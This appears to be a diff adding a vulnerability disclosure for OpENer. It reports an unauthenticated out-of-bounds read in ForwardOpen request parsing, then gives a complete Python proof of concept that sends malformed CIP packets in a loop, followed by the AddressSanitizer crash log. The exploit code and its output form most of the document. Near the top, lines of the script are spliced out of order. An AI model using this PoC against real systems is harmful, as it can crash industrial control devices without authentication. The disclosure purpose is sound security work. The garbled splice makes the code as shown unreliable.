@@ -1,0 +1,246 @@
+issue #564
+
+Vulnerability Description
+
+OpENer (commit 76b95cf) has an out-of-bounds read issue in Connection Manager handling of ForwardOpen requests when processing short malformed packets. An attacker can send a valid ENIP outer frame carrying a malformed CIP ForwardOpen/LargeForwardOpen request, causing the parser to continue reading fields even when request data is insufficient. This issue is remotely triggerable via network traffic and does not require authentication.
+
+Root Cause
+
+The root cause is the combination of parse-before-validate logic and missing remaining-length boundary checks in low-level read helpers:
+
+In ForwardOpenRoutine() in source/src/cip/cipconnectionmanager.c, the code calls ConnectionObjectInitializeFromMessage(&(message_router_request->data), ...) before completing strict minimal-length validation.
+ConnectionObjectInitializeFromMessage() in source/src/cip/cipconnectionobject.c repeatedly calls GetByteFromMessage() / GetUintFromMessage() / GetUdintFromMessage() to parse fields, but this call chain does not carry a "remaining readable length" parameter for per-read boundary checks.
+GetByteFromMessage() in source/src/enet_encap/endianconv.c directly reads buffer[0] and advances the pointer; when the input pointer is already at the end of the receive buffer, it performs an out-of-bounds read.
+
+PoC
+
+#!/usr/bin/env python3
+
+N)
+    if len(header) < ENCAP_HEADER_LEN:import argparse
+import socket
+import struct
+import sys
+import time
+from typing import Optional
+
+ENCAP_HEADER_LEN = 24
+CMD_REGISTER_SESSION = 0x0065
+CMD_SEND_RR_DATA = 0x006F
+
+ITEM_NULL = 0x0000
+ITEM_UCMM = 0x00B2
+
+SERVICE_FORWARD_OPEN = 0x54
+SERVICE_LARGE_FORWARD_OPEN = 0x5B
+
+# CIP route path: class 0x06 / instance 0x01
+CM_CLASS_INSTANCE_PATH = bytes([0x20, 0x06, 0x24, 0x01])
+
+ROUTE_PATH_LEN = 470
+ROUTE_PATH_WORDS = ROUTE_PATH_LEN // 2  # 235
+
+
+def encap_header(command: int, length: int, session: int, context: bytes) -> bytes:
+    return (
+        struct.pack("<H", command)
+        + struct.pack("<H", length)
+        + struct.pack("<I", session)
+        + b"\x00" * 4
+        + context[:8].ljust(8, b"\x00")
+        + b"\x00" * 4
+    )
+
+
+def recv_enip(sock: socket.socket) -> Optional[bytes]:
+    header = sock.recv(ENCAP_HEADER_LE
+        return None
+    _, payload_len, _, _ = struct.unpack("<HHII", header[:12])
+    payload = b""
+    while len(payload) < payload_len:
+        chunk = sock.recv(payload_len - len(payload))
+        if not chunk:
+            return None
+        payload += chunk
+    return header + payload
+
+
+def register_session(sock: socket.socket, context: bytes) -> int:
+    request = encap_header(CMD_REGISTER_SESSION, 4, 0, context) + struct.pack("<HH", 1, 0)
+    sock.sendall(request)
+    response = recv_enip(sock)
+    if not response or len(response) < ENCAP_HEADER_LEN:
+        raise RuntimeError("RegisterSession response is empty")
+
+    cmd, _, session, status = struct.unpack("<HHII", response[:12])
+    if cmd != CMD_REGISTER_SESSION or status != 0 or session == 0:
+        raise RuntimeError(
+            f"RegisterSession failed: cmd=0x{cmd:04x} status=0x{status:08x} session=0x{session:08x}"
+        )
+    return session
+
+
+def send_rr(sock: socket.socket, session: int, context: bytes, cip_payload: bytes) -> Optional[bytes]:
+    cpf = (
+        struct.pack("<H", 2)
+        + struct.pack("<H", ITEM_NULL)
+        + struct.pack("<H", 0)
+        + struct.pack("<H", ITEM_UCMM)
+        + struct.pack("<H", len(cip_payload))
+        + cip_payload
+    )
+    command_specific = b"\x00" * 4 + b"\x00" * 2 + cpf
+    frame = encap_header(CMD_SEND_RR_DATA, len(command_specific), session, context) + command_specific
+    sock.sendall(frame)
+    return recv_enip(sock)
+
+
+def build_large_route_path(path_len: int) -> bytes:
+    if path_len < len(CM_CLASS_INSTANCE_PATH):
+        raise ValueError("route path length too small")
+    if path_len % 2 != 0:
+        raise ValueError("route path length must be even")
+    pad_len = path_len - len(CM_CLASS_INSTANCE_PATH)
+    # Use member-segment bytes (0x28 + value) as safe filler.
+    filler = b"\x28\x00" * (pad_len // 2)
+    return CM_CLASS_INSTANCE_PATH + filler
+
+
+def build_malicious_forward_open(use_large_service: bool) -> bytes:
+    service = SERVICE_LARGE_FORWARD_OPEN if use_large_service else SERVICE_FORWARD_OPEN
+    route_path = build_large_route_path(ROUTE_PATH_LEN)
+    path_words = len(route_path) // 2
+    if path_words > 0xFF:
+        raise ValueError("path_words overflow")
+    # No request_data bytes at all: request_data_size == 0.
+    return bytes([service, path_words]) + route_path
+
+
+def one_attempt(host: str, port: int, timeout: float, context: bytes, use_large_service: bool) -> str:
+    cip = build_malicious_forward_open(use_large_service=use_large_service)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    try:
+        sock.connect((host, port))
+        session = register_session(sock, context)
+        resp = send_rr(sock, session, context, cip)
+        if resp is None:
+            return "no response (possible crash/abort/reset)"
+        return f"response_len={len(resp)}"
+    finally:
+        sock.close()
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(
+        description="ASan-oriented PoC for ForwardOpen pre-parse OOB read"
+    )
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=44818)
+    parser.add_argument("--timeout", type=float, default=1.5)
+    parser.add_argument("--attempts", type=int, default=50)
+    parser.add_argument("--interval-ms", type=int, default=50)
+    parser.add_argument(
+        "--service",
+        choices=("forward-open", "large-forward-open"),
+        default="forward-open",
+        help="which CIP service code to use",
+    )
+    args = parser.parse_args()
+
+    if args.attempts <= 0:
+        raise ValueError("attempts must be > 0")
+    if args.interval_ms < 0:
+        raise ValueError("interval-ms must be >= 0")
+
+    use_large = args.service == "large-forward-open"
+    print(
+        f"[*] target={args.host}:{args.port} attempts={args.attempts} "
+        f"service={args.service} route_path_len={ROUTE_PATH_LEN} "
+        f"route_path_words={ROUTE_PATH_WORDS} request_data_size=0"
+    )
+
+    for i in range(args.attempts):
+        context = f"FWOOB{i:03d}".encode("ascii")[:8]
+        try:
+            info = one_attempt(args.host, args.port, args.timeout, context, use_large)
+            print(f"[{i + 1:03d}] sent: {info}")
+        except Exception as exc:  # noqa: BLE001
+            print(f"[{i + 1:03d}] fail: {type(exc).__name__}: {exc}")
+        if args.interval_ms > 0 and i + 1 < args.attempts:
+            time.sleep(args.interval_ms / 1000.0)
+
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+
+ASan
+
+networkhandler: opened new TCP connection on fd 22
+=================================================================
+==576651==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe15b181d0 at pc 0x55a88b39f67e bp 0x7ffe15b17570 sp 0x7ffe15b17560
+READ of size 1 at 0x7ffe15b181d0 thread T0
+    #0 0x55a88b39f67d in GetByteFromMessage /home/user/OpENer/source/src/enet_encap/endianconv.c:40
+    #1 0x55a88b36715f in ConnectionObjectInitializeFromMessage /home/user/OpENer/source/src/cip/cipconnectionobject.c:124
+    #2 0x55a88b36da2e in ForwardOpenRoutine /home/user/OpENer/source/src/cip/cipconnectionmanager.c:596
+    #3 0x55a88b36d9a2 in ForwardOpen /home/user/OpENer/source/src/cip/cipconnectionmanager.c:579
+    #4 0x55a88b356665 in NotifyClass /home/user/OpENer/source/src/cip/cipcommon.c:127
+    #5 0x55a88b382854 in NotifyMessageRouter /home/user/OpENer/source/src/cip/cipmessagerouter.c:217
+    #6 0x55a88b393f8f in NotifyCommonPacketFormat /home/user/OpENer/source/src/enet_encap/cpf.c:60
+    #7 0x55a88b39c886 in HandleReceivedSendRequestResponseDataCommand /home/user/OpENer/source/src/enet_encap/encap.c:558
+    #8 0x55a88b399840 in HandleReceivedExplictTcpData /home/user/OpENer/source/src/enet_encap/encap.c:186
+    #9 0x55a88b350be6 in HandleDataOnTcpSocket /home/user/OpENer/source/src/ports/generic_networkhandler.c:864
+    #10 0x55a88b34ed8a in NetworkHandlerProcessCyclic /home/user/OpENer/source/src/ports/generic_networkhandler.c:497
+    #11 0x55a88b34c513 in executeEventLoop /home/user/OpENer/source/src/ports/POSIX/main.c:261
+    #12 0x55a88b34c3bd in main /home/user/OpENer/source/src/ports/POSIX/main.c:229
+    #13 0x7f77783e9082 in __libc_start_main ../csu/libc-start.c:308
+    #14 0x55a88b34bbed in _start (/home/user/OpENer/bin/posix/src/ports/POSIX/OpENer+0x89bed)
+
+Address 0x7ffe15b181d0 is located in stack of thread T0 at offset 1312 in frame
+    #0 0x55a88b35027b in HandleDataOnTcpSocket /home/user/OpENer/source/src/ports/generic_networkhandler.c:720
+
+  This frame has 6 object(s):
+    [48, 52) 'remaining_bytes' (line 722)
+    [64, 68) 'fromlen' (line 852)
+    [80, 88) 'read_buffer' (line 760)
+    [112, 128) 'sender_address' (line 850)
+    [144, 672) 'outgoing_message' (line 862)
+    [800, 1312) 'incoming_message' (line 732) <== Memory access at offset 1312 overflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow /home/user/OpENer/source/src/enet_encap/endianconv.c:40 in GetByteFromMessage
+Shadow bytes around the buggy address:
+  0x100042b5afe0: 00 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2
+  0x100042b5aff0: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 00 00 00 00 00 00
+  0x100042b5b000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100042b5b010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100042b5b020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x100042b5b030: 00 00 00 00 00 00 00 00 00 00[f3]f3 f3 f3 f3 f3
+  0x100042b5b040: f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100042b5b050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100042b5b060: f1 f1 f1 f1 06 f3 f3 f3 00 00 00 00 00 00 00 00
+  0x100042b5b070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100042b5b080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==576651==ABORTING
